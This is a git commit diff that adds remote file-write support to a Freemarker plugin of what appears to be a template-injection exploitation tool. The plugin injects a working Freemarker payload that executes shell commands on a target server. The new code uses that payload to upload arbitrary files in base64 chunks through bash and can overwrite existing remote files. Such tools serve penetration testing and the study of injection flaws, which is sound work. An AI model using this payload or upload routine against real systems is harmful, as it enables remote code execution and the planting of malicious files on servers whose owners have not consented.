15576b4efc66b6f67c43973f16de4da247023090
Emilio Pinna <emilio.pinn@gmail.com>
2016-07-09 10:16:08 +0100

    Add --file-write support in Freemarker plugin

--- plugins/engines/freemarker.py
+++ plugins/engines/freemarker.py
@@ -1,7 +1,8 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-from utils.strings import quote
+from utils.strings import quote, chunkit, base64encode, md5
+import re
 
 class Freemarker(Check):
 
@@ -30,9 +31,41 @@ class Freemarker(Check):
 
         if expected_rand == self.execute('echo %s' % expected_rand):
             self.set('exec', True)
+            # TODO: manage Window environment
             self.set('os', self.execute("uname"))
 
 
     def execute(self, command):
 
         return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (quote(command)))
+
+    def detect_write(self):
+        self.set('write', self.get('exec'))
+    
+    def _md5(self, remote_path):
+        
+        md5_result = self.execute("bash -c md5<%s" % (remote_path))
+        md5_extracted = re.findall(r"([a-fA-F\d]{32})", md5_result)
+        if md5_extracted:
+            return md5_extracted[0]
+    
+    def write(self, data, remote_path):
+        
+        # Check existance and overwrite with --force-overwrite
+        if self._md5(remote_path):
+            if not self.channel.args.get('force_overwrite'):
+                log.warn('Remote path already exists, use --force-overwrite for overwrite')
+                return
+            else:
+                self.execute("bash -c {echo,-n,}>%s" % (remote_path))
+        
+        # Upload file in chunks of 500 characters
+        for chunk in chunkit(data, 500):
+            
+            chunk_b64 = base64encode(chunk)
+            self.execute("bash -c {base64,--decode}<<<%s>>%s" % (chunk_b64, remote_path))
+        
+        if not md5(data) == self._md5(remote_path):
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.warn('File uploaded correctly')
